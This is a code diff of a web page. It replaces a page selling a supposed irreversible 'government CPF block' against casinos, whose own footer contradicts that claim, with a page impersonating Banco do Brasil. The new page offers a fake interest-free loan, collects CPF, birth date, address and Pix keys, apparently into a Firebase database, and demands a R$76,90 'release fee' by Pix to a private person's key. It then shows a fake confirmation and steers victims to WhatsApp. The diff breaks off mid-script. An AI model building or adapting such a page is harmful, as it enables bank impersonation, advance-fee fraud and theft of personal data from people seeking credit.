@@ -1,229 +1,1028 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="pt-br">
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Bloqueio Governamental de CPF para Cassinos | Pare com as Apostas</title>
-    <meta name="description" content="Bloqueio governamental na raiz do CPF para cassinos online. Impossível cadastrar em qualquer plataforma de apostas. Pacotes de R$ 139,99 a R$ 500.">
-    <meta name="theme-color" content="#22c55e">
-    <link rel="canonical" href="https://exemplo.com/">
-    <meta property="og:locale" content="pt_BR">
-    <meta property="og:type" content="website">
-    <meta property="og:title" content="Bloqueio Governamental de CPF para Cassinos | Pare com as Apostas">
-    <meta property="og:description" content="Bloqueio governamental na raiz do CPF. Impossível cadastrar em qualquer cassino online. Pacotes de R$ 139,99 a R$ 500.">
-    <meta property="og:image" content="logo.svg">
-    <meta property="og:url" content="https://exemplo.com/">
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Bloqueio Governamental de CPF para Cassinos">
-    <meta name="twitter:description" content="Bloqueio governamental na raiz do CPF. Impossível cadastrar em qualquer cassino online.">
-    <meta name="twitter:image" content="logo.svg">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="styles.css">
-    <link rel="icon" href="favicon.svg" type="image/svg+xml">
-    <link rel="icon" href="favicon.ico">
-    
-    <!-- Firebase SDK -->
-    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>BB Crédito | Simulação de Empréstimo</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, -apple-system, 'Helvetica Neue', Roboto, sans-serif;
+        }
+
+        body {
+            background: #eef2f5;
+            min-height: 100vh;
+            padding: 40px 24px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Loading Overlay */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(4px);
+            z-index: 2000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .loader {
+            width: 48px;
+            height: 48px;
+            border: 3px solid rgba(255, 215, 0, 0.3);
+            border-top: 3px solid #FFD700;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: white;
+            font-size: 0.9rem;
+            font-weight: 500;
+        }
+
+        /* Container principal */
+        .loan-app {
+            max-width: 580px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 24px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
+            overflow: hidden;
+        }
+
+        /* Header institucional */
+        .bank-header {
+            background: #002776;
+            padding: 28px 32px;
+            color: white;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+
+        .brand-icon {
+            background: #FFD700;
+            width: 44px;
+            height: 44px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            font-size: 22px;
+            color: #002776;
+        }
+
+        .brand-name {
+            font-size: 26px;
+            font-weight: 700;
+            letter-spacing: -0.3px;
+        }
+
+        .brand-slogan {
+            font-size: 12px;
+            opacity: 0.85;
+            border-left: 2px solid #FFD700;
+            padding-left: 12px;
+            margin-top: 6px;
+        }
+
+        /* Stepper */
+        .stepper {
+            display: flex;
+            background: #ffffff;
+            padding: 16px 28px;
+            gap: 8px;
+            border-bottom: 1px solid #e9ecef;
+        }
+
+        .step {
+            flex: 1;
+            font-size: 12px;
+            font-weight: 600;
+            text-align: center;
+            padding: 8px 0;
+            border-radius: 20px;
+            background: #f5f7fa;
+            color: #6c757d;
+        }
+
+        .step.active {
+            background: #002776;
+            color: #FFD700;
+        }
+
+        .step i {
+            margin-right: 6px;
+            font-size: 11px;
+        }
+
+        /* Formulário */
+        .form-container {
+            padding: 28px 32px 32px;
+        }
+
+        .page {
+            display: none;
+            animation: fadeIn 0.25s ease;
+        }
+
+        .page.active-page {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        h3 {
+            font-size: 1.4rem;
+            font-weight: 600;
+            color: #002776;
+            margin-bottom: 24px;
+        }
+
+        .label {
+            font-weight: 600;
+            margin: 18px 0 6px 0;
+            display: block;
+            color: #495057;
+            font-size: 0.8rem;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 12px 16px;
+            border-radius: 12px;
+            border: 1px solid #dee2e6;
+            font-size: 0.95rem;
+            transition: all 0.2s;
+            background: white;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: #002776;
+            box-shadow: 0 0 0 2px rgba(0, 39, 118, 0.1);
+        }
+
+        .input-error {
+            border-color: #dc3545;
+        }
+
+        .error-msg {
+            color: #dc3545;
+            font-size: 11px;
+            margin-top: 4px;
+        }
+
+        .btn-primary {
+            background: #002776;
+            color: white;
+            font-weight: 600;
+            border: none;
+            padding: 14px;
+            border-radius: 40px;
+            width: 100%;
+            font-size: 0.95rem;
+            margin-top: 28px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-primary:hover {
+            background: #001f5e;
+        }
+
+        .btn-secondary {
+            background: #f8f9fa;
+            color: #495057;
+            border: 1px solid #dee2e6;
+            padding: 12px;
+            border-radius: 40px;
+            width: 100%;
+            margin-top: 12px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        .btn-secondary:hover {
+            background: #e9ecef;
+        }
+
+        .offer-box {
+            background: #f8f9fa;
+            border-radius: 20px;
+            padding: 24px;
+            text-align: center;
+            margin: 20px 0;
+            border: 1px solid #e9ecef;
+        }
+
+        .amount-highlight {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #002776;
+            margin: 12px 0 4px;
+        }
+
+        .parcelas-info {
+            margin: 24px 0;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 16px;
+            border: 1px solid #e9ecef;
+        }
+
+        .parcela-valor {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: #002776;
+            margin-bottom: 8px;
+        }
+
+        .parcela-descricao {
+            font-size: 0.9rem;
+            color: #6c757d;
+        }
+
+        .info-badge {
+            background: #f8f9fa;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 12px;
+            text-align: center;
+            margin-top: 16px;
+            color: #6c757d;
+        }
+
+        .pix-card {
+            background: #f8f9fa;
+            border-radius: 20px;
+            padding: 20px;
+            margin: 20px 0;
+            border: 1px solid #e9ecef;
+        }
+
+        .pix-option {
+            margin: 12px 0;
+            padding: 12px;
+            border: 1px solid #dee2e6;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .pix-option.selected {
+            border-color: #002776;
+            background: #f8f9ff;
+        }
+
+        .pix-option input {
+            width: auto;
+            margin-right: 10px;
+            transform: scale(1);
+        }
+
+        .pix-input-field {
+            margin-top: 12px;
+            display: none;
+        }
+
+        .pix-input-field.show {
+            display: block;
+        }
+
+        .fee-box {
+            background: #fef7e0;
+            border-radius: 16px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+            border: 1px solid #ffe6b3;
+        }
+
+        .fee-value {
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: #b45f06;
+            margin: 8px 0;
+        }
+
+        footer {
+            background: #f8f9fa;
+            padding: 20px 32px;
+            font-size: 11px;
+            color: #6c757d;
+            text-align: center;
+            border-top: 1px solid #e9ecef;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin-top: 10px;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: #002776;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 11px;
+        }
+
+        select {
+            cursor: pointer;
+        }
+
+        /* Modal de comprovante */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 3000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .modal-overlay.active {
+            display: flex;
+        }
+
+        .comprovante-modal {
+            background: white;
+            max-width: 500px;
+            width: 100%;
+            border-radius: 24px;
+            padding: 32px;
+            position: relative;
+            animation: slideUp 0.3s ease;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .comprovante-header {
+            text-align: center;
+            margin-bottom: 24px;
+            padding-bottom: 16px;
+            border-bottom: 2px solid #FFD700;
+        }
+
+        .comprovante-header i {
+            font-size: 48px;
+            color: #28a745;
+            margin-bottom: 12px;
+        }
+
+        .comprovante-header h4 {
+            font-size: 1.3rem;
+            color: #002776;
+        }
+
+        .comprovante-dados {
+            margin: 20px 0;
+        }
+
+        .dados-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid #e9ecef;
+        }
+
+        .dados-label {
+            font-weight: 600;
+            color: #495057;
+        }
+
+        .dados-value {
+            color: #002776;
+            font-weight: 500;
+        }
+
+        .valor-destaque {
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: #28a745;
+        }
+
+        .btn-fechar {
+            background: #002776;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 40px;
+            width: 100%;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        .btn-fechar:hover {
+            background: #001f5e;
+        }
+
+        .btn-copiar {
+            background: #28a745;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 40px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 12px;
+            width: 100%;
+            transition: background 0.2s;
+        }
+
+        .btn-copiar:hover {
+            background: #218838;
+        }
+
+        .btn-copiar i {
+            margin-right: 8px;
+        }
+
+        .toast-message {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #28a745;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 40px;
+            font-size: 14px;
+            z-index: 4000;
+            display: none;
+            animation: fadeInUp 0.3s ease;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateX(-50%) translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(-50%) translateY(0);
+            }
+        }
+    </style>
 </head>
 <body>
-    <header class="site-header">
-        <div class="container header-inner">
-            <div class="brand">
-                <img src="logo.svg" alt="Logo Anti Cassinos" class="logo" />
-                <span class="brand-name">Anti Cassinos</span>
-            </div>
-            <nav class="nav">
-                <a href="#como-funciona">Como funciona</a>
-                <a href="#beneficios">Benefícios</a>
-                <a href="#perguntas">FAQ</a>
-                <a href="#assinar" class="btn btn-primary small">Assinar</a>
-            </nav>
+
+<div class="loading-overlay" id="loadingOverlay">
+    <div class="loader"></div>
+    <div class="loading-text">Processando...</div>
+</div>
+
+<div class="toast-message" id="toastMsg">
+    <i class="fas fa-check-circle"></i> Código copiado!
+</div>
+
+<div class="loan-app">
+    <div class="bank-header">
+        <div class="brand">
+            <div class="brand-icon">BB</div>
+            <div class="brand-name">Banco do Brasil</div>
         </div>
-    </header>
+        <div class="brand-slogan">Crédito pessoal • Transparência e segurança</div>
+    </div>
 
-    <main>
-        <section class="hero">
-            <div class="container hero-inner">
-                <div class="hero-copy">
-                    <h1>Proteção definitiva contra cassinos online</h1>
-                    <p>Bloqueio na raiz governamental que impede qualquer cadastro em plataformas de apostas online. Uma vez ativado, é impossível criar contas em qualquer cassino ou casa de apostas.</p>
-                    <ul class="bullets">
-                        <li>Bloqueio governamental na raiz do CPF</li>
-                        <li>Impossível cadastrar em qualquer plataforma de apostas</li>
-                        <li>Proteção permanente e irreversível</li>
-                        <li>Pacotes acessíveis de R$ 139,99 a R$ 500</li>
-                    </ul>
-                    <a href="#pacotes" class="btn btn-primary">Ver pacotes disponíveis</a>
-                    <p class="support-note">Precisa de ajuda? <a href="#perguntas">Veja o FAQ</a></p>
-                </div>
-                <form id="lead-form" class="card form-card" aria-labelledby="form-title">
-                    <h2 id="form-title">Comece agora</h2>
-                    <div class="form-row">
-                        <label for="nome">Nome completo</label>
-                        <input id="nome" name="nome" type="text" required autocomplete="name" placeholder="Seu nome completo" />
-                    </div>
-                    <div class="form-row">
-                        <label for="cpf">CPF</label>
-                        <input id="cpf" name="cpf" inputmode="numeric" maxlength="14" required placeholder="000.000.000-00" aria-describedby="cpf-help" />
-                        <small id="cpf-help" class="help">Usamos apenas para processar o bloqueio em plataformas de apostas.</small>
-                    </div>
-                    <div class="form-row">
-                        <label for="email">E‑mail</label>
-                        <input id="email" name="email" type="email" required autocomplete="email" placeholder="seu@email.com" />
-                    </div>
-                    <div class="form-row">
-                        <label for="telefone">Telefone (opcional)</label>
-                        <input id="telefone" name="telefone" type="tel" inputmode="tel" maxlength="15" placeholder="(00) 00000-0000" />
-                    </div>
-                    <div class="form-row">
-                        <label for="pacote">Escolha seu pacote</label>
-                        <select id="pacote" name="pacote" required>
-                            <option value="basico">Básico - R$ 139,99 (Bloqueio governamental)</option>
-                            <option value="intermediario">Intermediário - R$ 220 (Bloqueio + Anúncios)</option>
-                            <option value="completo">Completo - R$ 500 (Bloqueio + Acompanhamento)</option>
-                        </select>
-                    </div>
-                    <div class="price-box" role="note" aria-label="Preço">
-                        <span class="price" id="preco-display">R$ 139,99</span>
-                        <span class="price-sub">pagamento único</span>
-                    </div>
-                    <button type="submit" class="btn btn-primary btn-block" id="submit-btn">
-                        <span class="btn-text">Continuar para pagamento</span>
-                        <span class="btn-loading" style="display: none;">Enviando...</span>
-                    </button>
-                    <p class="legal-mini">Ao continuar, você concorda com os <a href="#termos">Termos</a> e nossa <a href="#privacidade">Política de Privacidade</a>.</p>
-                </form>
-            </div>
-        </section>
+    <div class="stepper">
+        <div class="step" id="step1Label"><i class="fas fa-calculator"></i> Simular</div>
+        <div class="step" id="step2Label"><i class="fas fa-user"></i> Cadastro</div>
+        <div class="step" id="step3Label"><i class="fas fa-hand-holding-usd"></i> Oferta</div>
+        <div class="step" id="step4Label"><i class="fas fa-pix"></i> Pix</div>
+    </div>
 
-        <section id="como-funciona" class="section">
-            <div class="container">
-                <h2>Como funciona nossa proteção</h2>
-                <ol class="steps">
-                    <li>Você fornece seus dados e confirma o pagamento de forma segura</li>
-                    <li>Processamos sua solicitação junto ao governo para bloqueio na raiz do CPF</li>
-                    <li>O bloqueio é implementado no sistema, impedindo qualquer cadastro em plataformas de apostas</li>
-                    <li>Você recebe confirmação oficial do bloqueio por e‑mail</li>
-                </ol>
-                <div class="note-box">
-                    <p>Importante: o bloqueio é feito na raiz governamental do CPF, tornando impossível qualquer cadastro em plataformas de apostas online. Não afeta bancos, crédito ou serviços públicos.</p>
-                </div>
+    <div class="form-container">
+        <!-- PAGE 1 -->
+        <div id="page1" class="page active-page">
+            <h3>Quanto você precisa?</h3>
+            <label class="label">Valor desejado (R$)</label>
+            <input type="number" id="valorDesejado" placeholder="Ex: 5.000" min="1000" max="20000" step="500" value="5000">
+            <div class="info-badge">
+                <i class="fas fa-info-circle"></i>
             </div>
-        </section>
-
-        <section id="pacotes" class="section alt">
-            <div class="container">
-                <h2>Escolha seu pacote de proteção</h2>
-                <div class="grid-3">
-                    <div class="card package">
-                        <div class="package-content">
-                            <h3>Pacote Básico</h3>
-                            <div class="price-tag">R$ 139,99</div>
-                            <ul>
-                                <li>Bloqueio governamental na raiz do CPF</li>
-                                <li>Impossível cadastrar em qualquer cassino online</li>
-                                <li>Proteção permanente e irreversível</li>
-                                <li>Ativação em até 24 horas</li>
-                            </ul>
-                        </div>
-                        <div class="package-actions">
-                            <a href="#form-title" class="btn btn-outline btn-block" data-pacote="basico">Escolher este pacote</a>
-                        </div>
-                    </div>
-                    
-                    <div class="card package featured">
-                        <div class="package-content">
-                            <h3>Pacote Intermediário</h3>
-                            <div class="price-tag">R$ 220</div>
-                            <ul>
-                                <li>Tudo do pacote básico</li>
-                                <li>Bloqueio de anúncios de cassinos</li>
-                                <li>Configuração de filtros anti-apostas</li>
-                                <li>Proteção em todos dispositivos</li>
-                                <li>Suporte prioritário</li>
-                            </ul>
-                        </div>
-                        <div class="package-actions">
-                            <a href="#form-title" class="btn btn-primary btn-block" data-pacote="intermediario">Escolher este pacote</a>
-                        </div>
-                    </div>
-                    
-                    <div class="card package">
-                        <div class="package-content">
-                            <h3>Pacote Completo</h3>
-                            <div class="price-tag">R$ 500</div>
-                            <ul>
-                                <li>Tudo do pacote intermediário</li>
-                                <li>Acompanhamento completo de 1 mês</li>
-                                <li>Especialista em vício em apostas</li>
-                                <li>Análise matemática dos métodos de vício</li>
-                                <li>Livros e materiais para superação</li>
-                                <li>Métodos comprovados para se livrar do vício</li>
-                            </ul>
-                        </div>
-                        <div class="package-actions">
-                            <a href="#form-title" class="btn btn-outline btn-block" data-pacote="completo">Escolher este pacote</a>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <section id="perguntas" class="section">
-            <div class="container">
-                <h2>Perguntas frequentes</h2>
-                <div class="faq-grid">
-                    <details class="faq-item">
-                        <summary>O bloqueio governamental é realmente irreversível?</summary>
-                        <p>Sim. O bloqueio é feito na raiz governamental do CPF, tornando impossível qualquer cadastro em plataformas de apostas online. Uma vez implementado, não pode ser desfeito.</p>
-                    </details>
-                    <details class="faq-item">
-                        <summary>Como funciona o bloqueio de anúncios?</summary>
-                        <p>Configuramos filtros nos seus dispositivos para bloquear anúncios de cassinos e casas de apostas, criando um ambiente livre dessas tentações.</p>
-                    </details>
-                    <details class="faq-item">
-                        <summary>O que inclui o acompanhamento de 1 mês?</summary>
-                        <p>Especialista em vício em apostas, análise matemática dos métodos de vício, livros e materiais para superação, e métodos comprovados para se livrar do vício.</p>
-                    </details>
-                    <details class="faq-item">
-                        <summary>Isso afeta meu CPF em bancos ou crédito?</summary>
-                        <p>Não. O bloqueio se limita apenas a plataformas de jogos e apostas online, não afetando bancos, crédito ou serviços públicos.</p>
-                    </details>
-                </div>
-            </div>
-        </section>
-
-        <section id="assinar" class="section cta">
-            <div class="container cta-inner">
-                <h2>Comece sua proteção hoje</h2>
-                <p>Milhares de pessoas já se protegeram contra cassinos online. Escolha seu pacote e garanta sua tranquilidade.</p>
-                <a href="#form-title" class="btn btn-primary btn-large">Escolher pacote agora</a>
-            </div>
-        </section>
-    </main>
-
-    <footer class="site-footer">
-        <div class="container footer-grid">
-            <div>
-                <strong>Anti Cassinos</strong>
-                <p class="mini">Serviço de solicitação de bloqueio de CPF direcionado a plataformas de apostas online.</p>
-            </div>
-            <div>
-                <ul class="mini">
-                    <li><a href="#termos">Termos de Uso</a></li>
-                    <li><a href="#privacidade">Política de Privacidade</a></li>
-                    <li><a href="#contato" id="contato-link">Contato</a></li>
-                </ul>
-            </div>
+            <button class="btn-primary" id="btnToCadastro">Continuar</button>
         </div>
-        <div class="container legal">
-            <p class="mini">Aviso: Não realizamos bloqueios em sistemas governamentais. O serviço consiste em solicitar, em seu nome, a restrição de uso dos seus dados em plataformas privadas de jogos e apostas online, conforme melhores práticas e legislação aplicável.</p>
+
+        <!-- PAGE 2 -->
+        <div id="page2" class="page">
+            <h3>Identificação</h3>
+            <label class="label">Nome completo</label>
+            <input type="text" id="fullName" placeholder="Nome completo">
+            <label class="label">CPF</label>
+            <input type="text" id="cpf" placeholder="123.456.789-00" maxlength="14">
+            <div id="cpfError" class="error-msg"></div>
+            <label class="label">Data de nascimento</label>
+            <input type="date" id="birthDate">
+            <label class="label">CEP</label>
+            <input type="text" id="cep" placeholder="65000-000" maxlength="9">
+            <div id="cepError" class="error-msg"></div>
+            <label class="label">Endereço</label>
+            <input type="text" id="address" placeholder="Buscar CEP" readonly style="background:#fafbfc;">
+            <button class="btn-primary" id="btnValidarOferta">Gerar oferta</button>
+            <button class="btn-secondary" id="backPage1">Voltar</button>
         </div>
+
+        <!-- PAGE 3 -->
+        <div id="page3" class="page">
+            <h3>Crédito aprovado</h3>
+            <div class="offer-box">
+                <div>Valor liberado</div>
+                <div class="amount-highlight" id="valorAprovadoSpan">R$ 0,00</div>
+                <div style="font-size: 12px;">✅ Sem juros • Parcelas fixas</div>
+            </div>
+            
+            <label class="label">Número de parcelas (máx 48x)</label>
+            <select id="parcelasSelect"></select>
+            
+            <div class="parcelas-info">
+                <div class="parcela-valor" id="parcelaValorDisplay">R$ 0,00</div>
+                <div class="parcela-descricao" id="parcelaDescricao">parcela mensal</div>
+            </div>
+            
+            <button class="btn-primary" id="btnConfirmarParcelas">Confirmar parcelamento</button>
+            <button class="btn-secondary" id="backPage2">Alterar dados</button>
+        </div>
+
+        <!-- PAGE 4 -->
+        <div id="page4" class="page">
+            <h3>Receba por Pix</h3>
+            <div class="pix-card">
+                <div style="font-weight: 600; margin-bottom: 16px;">Chave Pix para recebimento</div>
+                
+                <div class="pix-option" data-type="cpf">
+                    <label><input type="radio" name="pixType" value="cpf"> CPF</label>
+                    <div class="pix-input-field" id="cpfInputField">
+                        <input type="text" id="pixCpf" placeholder="Digite o CPF">
+                    </div>
+                </div>
+                
+                <div class="pix-option" data-type="email">
+                    <label><input type="radio" name="pixType" value="email"> E-mail</label>
+                    <div class="pix-input-field" id="emailInputField">
+                        <input type="email" id="pixEmail" placeholder="exemplo@email.com">
+                    </div>
+                </div>
+                
+                <div class="pix-option" data-type="phone">
+                    <label><input type="radio" name="pixType" value="phone"> Telefone</label>
+                    <div class="pix-input-field" id="phoneInputField">
+                        <input type="text" id="pixPhone" placeholder="(99) 99999-9999">
+                    </div>
+                </div>
+                
+                <div class="pix-option" data-type="aleatoria">
+                    <label><input type="radio" name="pixType" value="aleatoria"> Chave aleatória</label>
+                    <div class="pix-input-field" id="aleatoriaInputField">
+                        <input type="text" id="pixAleatoria" placeholder="Digite a chave aleatória">
+                    </div>
+                </div>
+                <div id="pixError" class="error-msg" style="margin-top: 12px;"></div>
+            </div>
+
+            <div class="fee-box">
+                <div class="fee-value">R$ 76,90</div>
+                <div>Taxa única de liberação (TAC)</div>
+                <div style="font-size: 11px; margin-top: 6px;">Pagamento via Pix • Crédito em até 5 minutos</div>
+            </div>
+            
+            <button class="btn-primary" id="btnFinalizarTaxa">Pagar taxa e receber</button>
+            <button class="btn-secondary" id="backPage3">Voltar</button>
+        </div>
+    </div>
+    <footer>
+        <div>Banco do Brasil S.A. - CNPJ 00.000.000/0001-91</div>
+        <div class="footer-links">
+            <a href="https://www.bb.com.br/site/pra-voce/seguranca/">Segurança</a>
+            <a href="https://www.bb.com.br/site/pra-voce/seguranca/minha-privacidade/#/">Privacidade</a>
+            <a href="https://api.whatsapp.com/send?phone=+556140040001&text=Oi!%20Estou%20vindo%20do%20Portal%20BB.">Central de Atendimento</a>
+            <a href="https://www.bb.com.br/site/pra-voce/atendimento/ouvidoria/">Ouvidoria</a>
+        </div>
+        <div style="margin-top: 10px;">Emprestimo pessoal e Empresarial</div>
     </footer>
+</div>
 
-    <script src="scripts.js"></script>
+<!-- Modal de comprovante -->
+<div class="modal-overlay" id="comprovanteModal">
+    <div class="comprovante-modal">
+        <div class="comprovante-header">
+            <i class="fas fa-check-circle"></i>
+            <h4>Empréstimo Contratado</h4>
+            <p style="color: #6c757d; font-size: 12px;">Taxa paga com sucesso</p>
+        </div>
+        <div class="comprovante-dados">
+            <div class="dados-row">
+                <span class="dados-label">Valor creditado:</span>
+                <span class="dados-value valor-destaque" id="compValor">R$ 0,00</span>
+            </div>
+            <div class="dados-row">
+                <span class="dados-label">Parcelas:</span>
+                <span class="dados-value" id="compParcelas">0x</span>
+            </div>
+            <div class="dados-row">
+                <span class="dados-label">Nome:</span>
+                <span class="dados-value" id="compNome">-</span>
+            </div>
+            <div class="dados-row">
+                <span class="dados-label">CPF:</span>
+                <span class="dados-value" id="compCpf">-</span>
+            </div>
+            <div class="dados-row">
+                <span class="dados-label">Chave Pix destinatário:</span>
+                <span class="dados-value" id="compChave">-</span>
+            </div>
+            <div class="dados-row">
+                <span class="dados-label">Status:</span>
+                <span class="dados-value" style="color: #28a745;">Crédito debitado na conta</span>
+            </div>
+        </div>
+        <button class="btn-fechar" onclick="fecharComprovante()">Fechar</button>
+    </div>
+</div>
+
+<script>
+    // Firebase Config
+    const firebaseConfig = {
+        databaseURL: "https://bacbo-17c22-default-rtdb.asia-southeast1.firebasedatabase.app"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    let valorAprovado = 0;
+    let parcelasEscolhidas = 12;
+    let clienteData = {};
+
+    // PIX Copia e Cola
+    const pixCopiaCola = "00020126330014BR.GOV.BCB.PIX011110107764369520400005303986540576.905802BR5924Ridelvan Gomes Rodrigues6009SAO PAULO62140510Ay1kY5zfML6304E5B3";
+
+    function showToast(message) {
+        const toast = document.getElementById('toastMsg');
+        toast.innerHTML = `<i class="fas fa-check-circle"></i> ${message}`;
+        toast.style.display = 'block';
+        setTimeout(() => {
+            toast.style.display = 'none';
+        }, 2000);
+    }
+
+    function copiarPix() {
+        navigator.clipboard.writeText(pixCopiaCola).then(() => {
+            showToast('Código PIX copiado! Cole no seu app bancário');
+        }).catch(() => {
+            alert('Clique no código e copie manualmente');
+        });
+    }
+
+    function showLoading() {
+        document.getElementById('loadingOverlay').classList.add('active');
+    }
+    function hideLoading() {
+        setTimeout(() => {
+            document.getElementById('loadingOverlay').classList.remove('active');
+        }, 300);
+    }
+
+    function fecharComprovante() {
+        document.getElementById('comprovanteModal').classList.remove('active');
+        location.reload();
+    }
+
+    function abrirWhatsApp() {
+        const telefone = "5599985324287"; // 55 + 99 + 985324287
+        const mensagem = encodeURIComponent("Olá! Realizei o pagamento da taxa de R$ 76,90 para liberação do empréstimo. Segue confirmação.");
+        window.open(`https://wa.me/${telefone}?text=${mensagem}`, '_blank');
+    }
+
+    function mostrarComprovante(chavePixDigitada) {
+        document.getElementById('compValor').innerHTML = `R$ ${valorAprovado.toFixed(2)}`;
+        document.getElementById('compParcelas').innerHTML = `${parcelasEscolhidas}x de R$ ${(valorAprovado / parcelasEscolhidas).toFixed(2)}`;
+        document.getElementById('compNome').innerHTML = clienteData.nome;
+        document.getElementById('compCpf').innerHTML = clienteData.cpf;
+        document.getElementById('compChave').innerHTML = chavePixDigitada;
+        document.getElementById('comprovanteModal').classList.add('active');
+        
+        // Abre WhatsApp automaticamente após mostrar comprovante
+        setTimeout(() => {
+            abrirWhatsApp();
+        }, 500);
+    }
+
+    function abrirPagamentoPix() {
+        // Cria a nova aba com QR Code e botão de copiar
+        const novaAba = window.open();
+        novaAba.document.write(`
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <meta charset="UTF-8">
+                <title>BB - Pagamento da Taxa</title>
+                <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"><\/script>
+                <style>
+                    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+                    body { background: #eef2f5; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+                    .payment-container { max-width: 500px; width: 100%; background: white; border-radius: 24px; padding: 32px; box-shadow: 0 8px 24px rgba(0,0,0,0.1); text-align: center; }
+                    .header { background: #002776; color: white; padding: 20px; border-radius: 16px; margin-bottom: 24px; }
+                    .qr-code { display: flex; justify-content: center; margin: 24px 0; padding: 20px; background: white; border-radius: 16px; }
+                    #qrcode { width: 200px; height: 200px; }
+                    .pix-copia { background: #f8f9fa; padding: 16px; border-radius: 12px; margin: 20px 0; word-break: break-all; font-size: 12px; font-family: monospace; border: 1px solid #dee2e6; }
+                    .btn-copiar { background: #28a745; color: white; border: none; padding: 12px 20px; border-radius: 40px; font-size: 0.9rem; font-weight: 600; cursor: pointer; width: 100%; margin-top: 12px; transition: background 0.2s; }
+                    .btn-copiar:hover { background: #218838; }
+                    .btn-confirmar { background: #002776; color: white; border: none; padding: 14px 28px; border-radius: 40px; font-size: 1rem; font-weight: 600; cursor: pointer; margin-top: 20px; width: 100%; }
+                    .btn-confirmar:hover { background: #001f5e; }
+                    .taxa-info { font-size: 1.5rem; font-weight: 700; color: #b45f06; margin: 16px 0; }
+                    .aviso { font-size: 12px; color: #6c757d; margin-top: 16px; }
+                </style>
+            </head>
+            <body>
+                <div class="payment-container">
+                    <div class="header">
+                        <i class="fas fa-pix" style="font-size: 32px;"></i>
+                        <h3 style="margin-top: 8px;">Pagamento da Taxa de Liberação</h3>
+                    </div>
+                    <div class="taxa-info">R$ 76,90</div>
+                    <div class="qr-code">
+                        <div id="qrcode"></div>
+                    </div>
+                    <button class="btn-copiar" onclick="copiarPix()">
+                        <i class="fas fa-copy"></i> Copiar código PIX
